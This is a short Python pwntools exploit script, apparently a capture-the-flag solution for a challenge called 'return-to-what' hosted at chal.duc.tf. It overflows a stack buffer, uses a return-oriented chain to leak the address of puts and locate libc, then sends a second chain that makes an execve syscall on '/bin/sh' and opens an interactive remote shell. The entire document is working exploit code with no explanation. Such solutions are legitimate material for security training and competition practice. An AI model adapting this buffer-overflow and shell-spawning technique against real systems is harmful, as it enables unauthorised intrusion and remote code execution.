from pwn import *

elf = ELF('./return-to-what') 
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
#p = process('./return-to-what')
p = remote('chal.duc.tf', 30003)

payload = 'A'*56+p64(0x40122b)+p64(0x404018)+p64(elf.sym['puts'])+p64(elf.sym['vuln'])

print p.recv()
p.sendline(payload)
libc_puts = u64(p.recv(6)+'\x00\x00')
print 'libc: ', hex(libc_puts)
libc.address= libc_puts-libc.sym['puts']
print p.recv()
payload = 'A'*56+p64(libc.address+0x439c8)+p64(59)+p64(libc.address+0x2155f)+p64(libc.search('/bin/sh').next())+p64(libc.address+0x23e6a)+p64(0)+p64(libc.address+0x1b96)+p64(0)+p64(libc.address+0x13c0)
print 'payload: ', payload
p.sendline(payload)
p.interactive()
